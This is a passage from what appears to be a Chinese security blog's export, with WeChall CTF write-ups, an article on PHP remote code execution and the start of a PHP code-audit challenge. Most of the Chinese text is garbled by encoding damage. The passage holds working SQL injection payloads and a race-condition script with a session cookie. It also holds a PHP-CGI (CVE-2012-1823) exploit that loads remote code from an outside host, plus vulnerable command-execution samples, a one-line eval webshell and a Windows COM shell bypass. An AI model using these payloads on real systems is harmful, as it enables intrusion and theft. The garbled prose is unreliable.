%d)&quot; % (start, end)) if (end - start == 1): result.append(alphalist[start]) break else: middle = (start + end)/2 if(doAssert([idx, &apos;&lt;&apos;, alphalist[middle]])): end = middle else: start = middle print &apos;&apos;.join(result) Training: Net Portsè®©æˆ‘ä»¬é“¾æ¥è¿™ä¸ªä¸»æœºçš„42ç«¯å£ã€‚ curlä½¿ç”¨ â€“local-port å‚æ•°,å¸¦ä¸Šè‡ªå·±çš„cookies sudo curl â€“local-port 42 -c â€˜WC=YOUR_COOKIESâ€™ http://www.wechall.net/challenge/training/net/ports/index.php Pimitive Encryptionç”¨onetime-pad xoråŠ å¯†çš„zipæ–‡ä»¶,é€šè¿‡zipçš„magic numberå¯ä»¥ç¡®å®šonetime-padçš„å‰å››ä½,è½¬æ¢æˆcharè¾“å‡ºåå‘ç°æ˜¯3.14 äºæ˜¯è¯¥ç”¨ä»€ä¹ˆè§£å¯†å°±å¾ˆæ˜æ˜¾äº†,ä¸‹è½½ä¸€ä¸ªpiä¹‹åxorä¸€ä¸‹,å°±èƒ½è¿˜åŸäº† Repeating Historyç½‘é¡µå’Œgithubæ˜¯å¯¹åº”çš„ã€‚ã€‚ å…ˆç¿»åˆ°ç¬¬ä¸€ä¸ª https://github.com/gizmore/gwf3/blob/565015f6561776c90f77e5623d978d70ca7bf2d3/www/challenge/subversive/repeating/what_do_you_want_here.php ç„¶årepoå†…æœç´¢solutionå‘ç°äº†ä¸€ä¸ª https://github.com/gizmore/gwf3/blob/a98616544df4997a1bef7dfc109d35b3c6e0aab9/www/challenge/subversive/history/install.php md5è§£å‡ºæ¥æ˜¯wrongï¼Œç¿»ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„commitè®°å½• https://github.com/gizmore/gwf3/commit/a98616544df4997a1bef7dfc109d35b3c6e0aab9 -$solution = â€˜NothingHereMoveAlongâ€™; +$solution = â€˜2bda2998d9b0ee197da142a0447f6725â€™; æ‹¼æ¥ä¸€ä¸‹ï¼šInDaxInNothingHereMoveAlong Host Meæ”¹httpå¤´çš„Hostã€‚è¿™ç‚¹å¾ˆç®€å•ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå®ƒå†…ç½‘æœ‰ä¸€å°æœºå™¨ä¹Ÿå«åšlocalhostã€‚è¿™å°±å¯¼è‡´äº†å¦‚æœæ˜¯ç®€ç®€å•å•åœ°è®¿é—®localhostçš„è¯ï¼Œå…¶å®è®¿é—®çš„æ˜¯é‚£å°æœºå™¨è€Œéæˆ‘ä»¬åšé¢˜çš„æœºå™¨ã€‚ä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å°±è¦ä½¿ç”¨ç»å¯¹è·¯å¾„çš„ URLï¼Œå°±æ˜¯ GET åé¢çš„ç½‘å€è¡¥å…¨ï¼Œç„¶å Host å†å†™æˆlocalhostå°±å¯ä»¥äº† Stegano Womanæ‰“å¼€ä¹‹åæ³¨é‡Šéƒ¨åˆ†ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ å‘ç°æ˜¯09(tab)å’Œ20(space),æŠŠå…¶ä¸­çš„ä¸€ä¸ªå½“ä½œ1å¦ä¸€ä¸ªå½“ä½œ0,æ¢æˆäºŒè¿›åˆ¶å†è½¬æ¢æˆå­—ç¬¦ä¸²ä¹‹åè¾“å‡ºå³å¯ Quangcurrencyè¿™é¢˜ä¸ä¼šï¼Œæ²¡çœ‹æ‡‚ï¼Œé™„ä¸€ä¸ªåˆ«äººçš„writeup è¯»é¢˜æ˜¯å¾ˆé‡è¦çš„â€¦æ¥æŠŠè¿™ä¸ªé¢˜ç›®å¤§æ¦‚å¿µå‡ºæ¥,å®ƒæ˜¯ä»€ä¹ˆ?concurrencyå¯¹ä¸å¯¹?åˆæ˜¯ä¸€é“ç«æ€çš„é¢˜ç›®. åªè¦å¡ç€buyå’Œclick,æƒ³æ–¹è®¾æ³•è·‘åˆ°10ä¸ªitemå°±å¯ä»¥ cookie = { &apos;WC&apos;: &apos;8429765-12152-0vjRl2XoKWFYAmvh&apos; } def f1(): requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/click.php&apos;, cookies=cookie) def f2(): requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/buy.php&apos;, cookies=cookie) import requests import threading import time import lxml import lxml.html as H import re r = re.compile(r&apos;\w+: (\d+)&apos;) i = 0 while True: i += 1 print &quot;turn %d&quot; % i print &apos;start click&apos; t1 = threading.Thread(target = f1) print &apos;start buy&apos; t2 = threading.Thread(target = f2) t1.start() t2.start() t1.join() t2.join() text = requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/stats.php&apos;, cookies=cookie).text d = H.document_fromstring(text) msg = d.xpath(&apos;//div[@class=\&apos;box_c\&apos;]&apos;)[0] # import pdb;pdb.set_trace() a,b,c = r.findall(msg.text_content()) print &apos;get %s item &apos; % c if int(c)&gt;=10: break if int(a) &lt; 1000: print &apos;reset&apos; requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/reset.php&apos;, cookies=cookie) å‹æƒ…æç¤º,å®ƒè‚¯å®šå¯ä»¥è·‘å‡ºæ¥,ä½†å®ƒæ°¸è¿œä¸ä¼šåœä¸‹,æœ€å¥½è‡ªå·±ç¡®è®¤è¿™ä¸ªchallengeæ˜¯ä¸æ˜¯å·²ç»å®Œæˆäº†. Stop uså…³é”®åœ¨äºè¿™å¥è¯ â€˜ignore_user_abortâ€™ =&gt; false è¿™å¥è¯æ‰€é€ æˆçš„åæœå°±æ˜¯ï¼Œä¸€ä¸ªè„šæœ¬å½“ç”¨æˆ·æ–­å¼€è¿æ¥ï¼ˆå…³é—­çª—å£ä¹‹ç±»çš„ï¼‰ï¼Œè¿™ä¸ªè„šæœ¬å°±ä¼šè¢«å¼ºè¡Œç»ˆæ­¢ã€‚å†çœ‹çœ‹ php è„šæœ¬ï¼Œå¯ä»¥å‘ç°å®ƒæ˜¯å…ˆç»™æˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªåŸŸåï¼Œä¹‹åæ‰æ‰£è´¹çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨æ‰£è´¹å‰å…³æ‰é¡µé¢å³å¯ã€‚ Screwed SignupISCC2016çš„ä¸€é“é¢˜ SQL tableé‡Œusernameæœ€å¤š24ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯preg_matchæ£€æŸ¥æ—¶å¯ä»¥æœ€å¤šåˆ°64ä¸ªã€‚äºæ˜¯è¿™é‡Œå¯èƒ½é€ æˆæˆªæ–­. Table Names IIhttp://www.wechall.net/challenge/table_names/challenge.php ?username=&apos; union select database(),2,group_concat(0x3f,table_name) from information_schema.tables where table_schema=database() -- &amp;password=test &amp;login=login ä¹Ÿå¯ä»¥è¿™æ ·ï¼š http://www.wechall.net/challenge/table_names/challenge.php ?username=&apos; union select 1,2,info from information_schema.processlist-- &amp;password=test &amp;login=login è¿è¡Œç»“æœä¸ºï¼š Welcome back gizmore_tableu61 Your personal welcome message is: ?aaawrong,?usertableus4 This ensures you are not on a fake evil phising site. æäº¤ï¼šgizmore_tableu61_usertableus4 AUTH meSSL åŠ å¯†ä¼ è¾“çš„é—®é¢˜ã€‚ è®¿é—®https://authme.wechall.net/challenge/space/auth_me/www/index.php æç¤ºè¯´ï¼š Error Renegotiation is not allowed æ‰€ä»¥æˆ‘ä»¬éœ€è¦å»æ‰¾è¿™ä¸ªè¯ä¹¦ï¼Œç„¶åå¯¼å…¥ã€‚ å…¶å®ï¼Œä½ è§‚å¯Ÿä¸‹å®ƒ apache.conf çš„ç½‘å€ï¼Œ http://www.wechall.net/challenge/space/auth\_me/**find_me/apache.conf** ä¼šå‘ç°å«åš find_me çš„æ–‡ä»¶å¤¹ã€‚ç›´æ¥è®¿é—® apache.conf 05-May-2015 21:18 1.0K client.crt 05-May-2015 21:18 1.5K client.key 05-May-2015 21:18 3.2K client.p12 05-May-2015 21:18 4.7K server.crt 05-May-2015 21:18 1.5K å¯¼å…¥client.p12 å³å¯ Warchall: Live RCEå…·ä½“æ¼æ´æ˜¯ï¼šCVE-2012-1823ï¼ˆPHP-CGI RCEï¼‰ åœ¨åœ°å€åé¢åŠ è¿›å‚æ•°è¿è¡Œå¯¹åº”çš„php-cgi å‚æ•°çš„è¡Œä¸º,æ ¹æ®è§£é‡Šï¼Œå¦‚æœquery stringä¸­ä¸åŒ…å«æœªurlencodedçš„ç­‰å·ï¼Œé‚£ä¹ˆæ•´ä¸ªqueryä¼šä»¥ç©ºæ ¼åˆ†è¯ï¼Œä¼ ç»™php-cgiã€‚äºæ˜¯æˆ‘ä»¬ä¼ -sï¼Œå°±ä¼šæŠŠphpæ–‡ä»¶æºç å›æ˜¾ã€‚ ä¾‹å¦‚ index.php?-s ç›¸å‚äº/usr/bin/php53-cgi/php-cgi -f index.php -s php-cgi â€“helpå¦‚ä¸‹ Usage: php-cgi [-q] [-h] [-s] [-v] [-i] [-f &lt;file&gt;] php-cgi &lt;file&gt; [args...] -a Run interactively -b &lt;address:port&gt;|&lt;port&gt; Bind Path for external FASTCGI Server mode -C Do not chdir to the script&apos;s directory -c &lt;path&gt;|&lt;file&gt; Look for php.ini file in this directory -n No php.ini file will be used -d foo[=bar] Define INI entry foo with value &apos;bar&apos; -e Generate extended information for debugger/profiler -f &lt;file&gt; Parse &lt;file&gt;. Implies `-q&apos; -h This help -i PHP information -l Syntax check only (lint) -m Show compiled in modules -q Quiet-mode. Suppress HTTP Header output. -s Display colour syntax highlighted source. -v Version number -w Display source with stripped comments and whitespace. -z &lt;file&gt; Load Zend extension &lt;file&gt;. -T &lt;count&gt; Measure execution time of script repeated &lt;count&gt; times. æŸ¥çœ‹æºç ï¼š http://rce.warchall.net/?-s é‡Œé¢åŒ…å«äº†ä¸€ä¸ª../config.php,æ‰€ä»¥æˆ‘è¦å»è¯»å®ƒã€‚ åœ¨åˆšå¼€å§‹è¿›çš„é¡µé¢é‡Œå‘ç°index.phpçš„ç›®å½•ä¸ºï¼š [SCRIPT\_FILENAME] =&gt; /home/level/20_live_rce/www/index.php æ‰€ä»¥../config.php çš„ç»å¯¹è·¯å¾„æ˜¯ï¼š /home/level/20_live_rce/config.php php-cgiå‚æ•°ä¸­ï¼š d foo[=bar] Define INI entry foo with value â€˜barâ€™ -dallow_url_include=On -dauto_prepend_file=/tmp/2.php åœ¨/tmpé‡Œå»ºç«‹ä¸€ä¸ª2.phpå†…å®¹æ˜¯ &lt;?php exec(&quot;cat /home/level/20_live_rce/config.php&quot;,$out); print_r($out); ?&gt; æ„é€ åœ°å€ï¼š http://rce.warchall.net/?-d allow_url_include=On -d auto_prepend_file=http://oacotcyq8.bkt.clouddn.com/2.php -n urlencode: http://rce.warchall.net/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp%3%2f%2foacotcyq8.bkt.clouddn.com%2f2.php+-n Blinded by the lighterè¿˜æ˜¯ç›²æ³¨ï¼ŒåŠ æ—¶é—´å»¶è¿Ÿæ³¨å…¥ã€‚ Light in the Darknessè¿™é“é¢˜çš„é”™è¯¯ä¼šå›æ˜¾ï¼Œè€Œä¸”é™åˆ¶è¦åœ¨2æ¬¡queryå†…å¾—åˆ°ç­”æ¡ˆï¼Œæ‰€ä»¥ç”¨error basedï¼š POC1: &#39; or row(1,1) &gt; (select count(*),concat(password,&#39;$&#39;,floor(rand(0)*2))x from (select 1 union select 2 union select 3)a group by x limit 1) # POC2: &#39; or (select count(*) from information_schema.tables group by concat(password,floor(rand(0)*2)))-- åŸç†ï¼š http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do ç®€å•åœ°è¯´ï¼Œfloor(rand(0)*2)ä¼šå¾—åˆ°0,1,1,0â€¦â€¦ç¬¬2ä¸ªå’Œç¬¬3ä¸ªé‡å¤çš„1ä¼šé€ æˆé‡å¤çš„group_keyã€‚è€Œä¸”æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¡Œæ•°å¤§äº3çš„è¡¨ï¼Œæ‰€ä»¥é€‰æ‹©information_schema Brainfuckedalert(XXX)xxxä¸º æ–‡ä»¶å†…å®¹ã€‚ function anonymous() { var s = &apos;UnfudgedDebugStuff&apos;; s = s.length; alert(s); document.location.href=&apos;https://www.google.co.uk&apos;; } eXtract Meä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å‘ç°é‡Œé¢ä¸€ç›´æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œåº”è¯¥ä¸æ˜¯è¿™ä¹ˆå¤š è§£å‹ä¸€æ¬¡ä¹‹åä½¿ç”¨16è¿›åˆ¶æ‰“å¼€ å¯ä»¥å‘ç°æ˜¯ä¸¤ä¸ªå‹ç¼©åŒ…æ‹¼æ¥åœ¨ä¸€èµ·çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦æŠŠåé¢çš„å‹ç¼©åŒ…æ‰£å‡ºæ¥å³å¯ã€‚ è¿˜æ˜¯è§£å‹ï¼Œå‡ºæ¥ä¸€ä¸ªxaræ–‡ä»¶ï¼Œé€šè¿‡ 7zip è§£å‹ï¼Œå‡ºæ¥ä¸€ä¸ªåˆä¸€ä¸ªå¥‡è‘©æ–‡ä»¶ã€‚ã€‚ ä½†æ˜¯ï¼Œåœ¨è§£å‹é€”ä¸­ä¼šå‘ç°æœ‰ä¸€ä¸ªrar çš„æ³¨é‡Šæ˜¯æœ‰ä¸œè¥¿çš„ã€‚æ‹·è´å‡ºæ¥ï¼Œç”¨è¿™æ•°æ®æ–°å»ºä¸€ä¸ªraræ–‡ä»¶ï¼Œå‘ç°éœ€è¦å¯†ç ã€‚ å¯†ç ä¸ºï¼šL0LYouThInkiTSh0uldB3SoEasY? Are you blind?è¿˜æ˜¯ç›²æ³¨ï¼ŒæŠ¥é”™æ¥åˆ¤æ–­ã€‚]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>writeup</tag>
        <tag>WeChall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ€»ç»“]]></title>
    <url>%2F2016%2F07%2F23%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[è¿œç¨‹ä»£ç æ‰§è¡Œæ˜¯æŒ‡ç¨‹åºä»£ç åœ¨å¤„ç†è¾“å…¥è¾“å‡ºçš„æ—¶å€™æ²¡æœ‰ä¸¥æ ¼æ§åˆ¶ã€‚å¯¼è‡´ç”¨æˆ·å¯ä»¥æ„é€ å‚æ•°åŒ…å«æ‰§è¡Œè¿œç¨‹ä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œè¿›è€Œè·å–åˆ°æœåŠ¡å™¨æƒé™ï¼Œæ˜¯å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºçš„é€»è¾‘å±‚ä¸Šçš„æ¼æ´ 0x01 OSå‘½ä»¤æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ˜¯æŒ‡åº”ç”¨ç¨‹åºå¯¹ä¼ å…¥å‘½ä»¤è¡Œçš„å‚æ•°è¿‡æ»¤ä¸ä¸¥æ ¼å¯¼è‡´æ¶æ„ç”¨æˆ·èƒ½æ§åˆ¶æœ€ç»ˆæ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿›è€Œå…¥ä¾µç³»ç»Ÿï¼Œå¯¼è‡´ä¸¥é‡ç ´åçš„é«˜å±æ¼æ´ã€‚(bash,shell) shellæ˜¯ç³»ç»Ÿçš„ç”¨æˆ·ç•Œé¢ï¼Œæä¾›ç”¨æˆ·ä¸å†…æ ¸äº¤äº’æ“ä½œçš„æ¥å£ï¼Œå®ƒæ¥æ”¶ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤å¹¶æŠŠå®ƒé€å…¥åˆ°å†…æ ¸å»æ‰§è¡Œã€‚å®é™…ä¸Šshellæ˜¯ä¸€ä¸ªå‘½ä»¤è§£é‡Šå™¨ï¼Œå®ƒçš„ä¸€ä¸ªé‡è¦ç‰¹æ€§å°±æ˜¯å®ƒè‡ªèº«å°±æ˜¯ä¸€ä¸ªè§£é‡Šå‹çš„ç¨‹åºè¯­è¨€ã€‚ åˆ†ç±»ï¼š 1.1 OSæœ¬èº«å‘½ä»¤æ‰§è¡Œ 1.2 Webå‘½ä»¤æ‰§è¡Œ 1.3 æ•°æ®åº“å‘½ä»¤æ‰§è¡Œ 1.4 ç¬¬ä¸‰æ–¹è½¯ä»¶å‘½ä»¤æ‰§è¡Œ 0x02 å‘½ä»¤æ‰§è¡Œæ¨¡å‹0x02.1 PHPå‘½ä»¤æ‰§è¡Œå‡½æ•°åˆ©ç”¨1ã€systemï¼šsystemå‡½æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨çš„åº”ç”¨ç¨‹åºå¹¶å°†ç›¸åº”çš„æ‰§è¡Œç»“æœè¾“å‡ºï¼Œå‡½æ•°åŸå‹ä¸ºï¼š string system(string command,int &amp;return_var) å…¶ä¸­ï¼Œcommandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œreturn_varå­˜æ”¾æ‰§è¡Œå‘½ä»¤çš„æ‰§è¡Œåçš„çŠ¶æ€ ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š &lt;?php $dir = $_GET[&quot;dir&quot;]; if(isset($dir)) { echo &quot;&lt;pre&gt;&quot;; system(&quot;net user&quot;.$dir); echo &quot;&lt;/pre&gt;&quot;; } ?&gt; æ‰§è¡Œç»“æœä¸ºï¼š ä¸Šè¿°ä»£ç å°±æ˜¯æŠŠdirè¿™ä¸ªå‘½ä»¤å†™æ­»äº†ï¼ŒæŠŠnet useræ‰§è¡Œçš„ç»“æœç»™$dirå˜é‡ã€‚ä½†æ˜¯æ³¨æ„ä¸€äº›è¿æ¥ç¬¦ï¼Œç®¡é“ç¬¦å¦‚ï¼š&amp;,&amp;&amp;,|,||,:ç­‰ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥?dir=| netstat -an æ³¨ï¼š|åªæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œ||å‰åå‘½ä»¤éƒ½æ‰§è¡Œã€‚ 2ã€execï¼šexecå‡½æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨çš„åº”ç”¨ç¨‹åºï¼Œå‡½æ•°åŸå‹ä¸ºï¼š string exec(string command,array &amp;output,int &amp;return_var) å…¶ä¸­ï¼Œcommandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œoutputæ˜¯è·å¾—æ‰§è¡Œå‘½ä»¤è¾“å‡ºçš„æ¯ä¸€è¡Œå­—ç¬¦ä¸²ï¼Œreturn_varæ˜¯å­˜æ”¾æ‰§è¡Œå‘½ä»¤åçš„çŠ¶æ€å€¼ã€‚ ç¤ºä¾‹ä»£ç ï¼š &lt;?php $cmd = $_GET[&quot;cmd&quot;]; $output = array(); echo &quot;&lt;pre&gt;&quot;; exec($cmd,$output); echo &quot;&lt;/pre&gt;&quot;; while(list($key,$value)=each($output)) { echo $value.&quot;&lt;br&gt;&quot;; } ?&gt; æ‰§è¡Œç»“æœä¸ºï¼š 3ã€passthruï¼špassthruå‡½æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€ä¸ªunixç³»ç»Ÿå‘½ä»¤å¹¶æ˜¾ç¤ºåŸå§‹çš„è¾“å‡ºï¼Œå½“unixç³»ç»Ÿä»¤çš„è¾“å‡ºæ˜¯äºŒè¿›åˆ¶çš„æ•°æ®ï¼Œå¹¶ä¸”éœ€è¦ç›´æ¥è¿”å›å€¼ç»™æµè§ˆå™¨æ—¶ï¼Œéœ€è¦ä½¿ç”¨passthruå‡½æ•°æ¥æ›¿ä»£systemå’Œexecå‡½æ•°ã€‚åŸå‹ä¸ºï¼š void passthru(string command,int &amp;teturn_var) å…¶ä¸­commandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œreturn_varå­˜æ”¾æ‰§è¡Œå‘½ä»¤åçš„çŠ¶æ€å€¼ã€‚ ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š &lt;?php $cmd = $_GET[&quot;cmd&quot;]; echo &quot;&lt;pre&gt;&quot;; passthru($cmd); echo &quot;&lt;/pre&gt;&quot;; ?&gt; 4ã€shell_execï¼šæ‰§è¡Œshellå‘½ä»¤å¹¶è¿”å›è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼Œå‡½æ•°åŸå‹ä¸ºuï¼š string shell_exec(string command) å…¶ä¸­commandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ &lt;?php $cmd = $_GET[&quot;cmd&quot;]; echo &quot;&lt;pre&gt;&quot;; shell_exec($cmd); echo &quot;&lt;/pre&gt;&quot;; ?&gt; 5ã€`è¿ç®—ç¬¦ï¼šä¸shell_execåŠŸèƒ½ç›¸åŒï¼Œé€šå¸¸ç”¨äºç»•è¿‡é»‘åå• ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š &lt;?php $cmd = $_GET[&quot;cmd&quot;]; $output = `$cmd`; echo &quot;&lt;pre&gt;&quot;; echo $output; echo &quot;&lt;/pre&gt;&quot;; ?&gt; æ‰§è¡Œç»“æœä¸ºï¼š 0x02.2 evalæ³¨å…¥æ”»å‡»åˆ©ç”¨å‡ºæ¥å¯ä»¥åˆ©ç”¨å‡½æ•°å‘½ä»¤æ³¨å…¥æ”»å‡»æ–¹å¼å¤–è¿˜å¯ä»¥ä½¿ç”¨evalæ³¨å…¥æ”»å‡»æ–¹å¼ï¼Œevalå‡½æ•°ä¼šå°†å‚æ•°å­—ç¬¦ä¸²ä½œä¸ºphpç¨‹åºä»£ç æ¥æ‰§è¡Œï¼Œç”¨æˆ·å¯ä»¥å°†phpä»£ç ä¿å­˜æˆå­—ç¬¦ä¸²çš„å½¢å¼ï¼Œç„¶åä¼ é€’ç»™evalå‡½æ•°æ‰§è¡Œã€‚åŸå‹ä¸ºï¼š mixed eval(string code_str) å…¶ä¸­code_stræ˜¯phpä»£ç å­—ç¬¦ä¸²ï¼Œé€šè¿‡æ„é€ ä¼ å…¥evalå‡½æ•°ä¸­çš„å…¨éƒ¨æˆ–éƒ¨åˆ†å­—ç¬¦ä¸²çš„å†…å®¹å®ç°å‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚ ç¤ºä¾‹ä»£ç ï¼š &lt;?php $cmd = $_GET[&quot;cmd&quot;]; echo &quot;&lt;pre&gt;&quot;; eval($cmd); echo &quot;&lt;/pre&gt;&quot;; ?&gt; å¦‚æœä¼ å…¥çš„å†…å®¹ä¸ºphpinfo();,è‹¥ä¼ å…¥çš„æ˜¯ä¸€å¥è¯æœ¨é©¬&lt;?php eval($_POST[cmd]);?&gt;å°±å¯ä»¥ç›´æ¥æ‹¿shellã€‚ ç¤ºä¾‹ç»“æœä¸ºï¼š 0x02.3 PHP webshellå‘½ä»¤æ‰§è¡Œé˜²å¾¡åŠç»•è¿‡æ–¹æ³•0x02.3.1 PHPç¦æ­¢webshellæ‰§è¡Œå‘½ä»¤é˜²å¾¡PHPçš„é…ç½®æ–‡ä»¶php.inié‡Œé¢æœ‰ä¸ªdisable_functions =é…ç½®è¿™ä¸ªï¼Œç¦æ­¢æŸäº›phpå‡½æ•°ï¼Œä¾¿å¯ä»¥ç¦æ­¢phpçš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä¾‹å¦‚ï¼š disable_functions=system,passthru,shell_exec,exec,popen 0x02.3.2 PHP webshellå‘½ä»¤æ‰§è¡Œç»•è¿‡æ–¹æ³•1.é»‘åå•ç»•è¿‡ phpèƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æœ‰ï¼š assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,`(åå•å¼•å·) æ ¹æ®é»‘åå•ä¸­æ²¡æœ‰çš„å‡½æ•°ï¼Œå³å¯ç»•è¿‡ã€‚ 2.ç³»ç»Ÿç»„ä»¶ç»•è¿‡ åªé€‚ç”¨äºwindowsï¼Œä»£ç å¦‚ä¸‹ï¼š &lt;?php $command = $_POST[a]; $wsh = new COM(&apos;WScript.shell&apos;); //ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡ $exec = $wsh-&gt;exec(&apos;cmd.exe /c &apos;.$command); //è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ $stdout = $exec-&gt;StdOut(); $stroutput = $stdout-&gt;ReadAll(); echo $stroutput ?&gt; å¦‚ä½•é˜²å¾¡ï¼šç›´æ¥åˆ é™¤system32ä¸‹çš„wshom.ocxæ–‡ä»¶ 2.æ‹“å±•åº“ç»•è¿‡ 0x02.4 PHP create_function()æ³¨å…¥å‘½ä»¤æ‰§è¡Œæ¼æ´åœ¨PHPä¸­ä½¿ç”¨create_function()åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå¦‚æœæ²¡æœ‰ä¸¥æ ¼å¯¹å‚æ•°ä¼ é€’è¿›è¡Œè¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹æ®Šå­—ç¬¦ä¸²ä¼ é€’ç»™create_function()æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚]]></content>
      <tags>
        <tag>WAFç»•è¿‡</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸€ä¸ªç®€å•çš„ä»£ç å®¡è®¡å’ŒMD5çˆ†ç ´è„šæœ¬]]></title>
    <url>%2F2016%2F07%2F21%2F%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8CMD5%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[0x01 phpæ˜¯æœ€å¥½çš„è¯­è¨€ä»£ç å®¡è®¡ã€‚ æè¿°ï¼šæ®è¯´phpæ˜¯æœ€å¥½çš„è¯­è¨€ï¼Œperfectï¼Ÿæ¥è¯•è¯•çœ‹ã€‚åœ°å€ï¼šhttp://218.76.35.75:20114/æºç å¦‚ä¸‹ï¼š &lt;?php show_source(__FILE__); $v1=0;$v2=0;$v3=0; $a=(array)json_decode(@$_GET[&apos;foo&apos;]); if(is_array($a)){ is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL; if(@$a[&quot;bar1&quot;]){ ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL; } if(is_array(@$a[&quot;bar2&quot;])){ if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;); $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]); $pos===false?die(&quot;nope&quot;):NULL; foreach($a[&quot;bar2&quot;] as $key=&gt;$val){ $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL; } $v2=1; } } $c=@$_GET[&apos;cat&apos;]; $d=@$_GET[&apos;dog&apos;]; if(@$c[1]){ if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){ eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL; strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL; } } if($v1 &amp;&amp; $v2 &amp;&amp; $v3){ include &quot;flag.php&quot;; echo $flag; } ?&gt; tipsï¼šåœ¨æœ¬åœ°æ­å»ºç¯å¢ƒä¸€ä¸ªä¸€ä¸ªè¾“å‡ºï¼Œçœ‹æ˜¯ä»€ä¹ˆæƒ…å†µ æ„é€ æºç å¦‚ä¸‹ï¼š &lt;?php $v1=0;$v2=0;$v3=0; //ç»™3ä¸ªå˜é‡èµ‹å€¼ $a=(array)json_decode(@$_GET[&apos;foo&apos;]); //json_decodeè§£ç ï¼Œæ‰€ä»¥è¦çŸ¥é“ç¼–ç çš„æ ·å¼ var_dump($a); echo &apos;&lt;/br&gt;&apos;; var_dump($_GET[&apos;foo&apos;]); echo &apos;&lt;/br&gt;&apos;; if(is_array($a)){ //åˆ¤æ–­æ˜¯ä¸æ˜¯æ•°ç»„ echo ($a[&quot;bar1&quot;]); echo &apos;&lt;/br&gt;&apos;; echo is_numeric(@$a[&quot;bar1&quot;]); echo &apos;&lt;/br&gt;&apos;; is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope1&quot;):NULL; //åˆ¤æ–­æ˜¯ä¸æ˜¯çº¯æ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯å°±dieè¾“å‡ºnope1 if(@$a[&quot;bar1&quot;]){ ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL; //phpå¼±ç±»å‹ï¼Œå…¶ä»–ç±»å‹å’Œæ•´å½¢æ¯”è¾ƒæ—¶ï¼Œå…ˆæŠŠå…¶ä»–ç±»å‹è½¬åŒ–ä¸ºæ•´å½¢ echo $v1; echo &apos;&lt;/br&gt;&apos;; } if(is_array(@$a[&quot;bar2&quot;])){ //åˆ¤æ–­æ˜¯ä¸æ˜¯æ•°ç»„ if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope2&quot;); 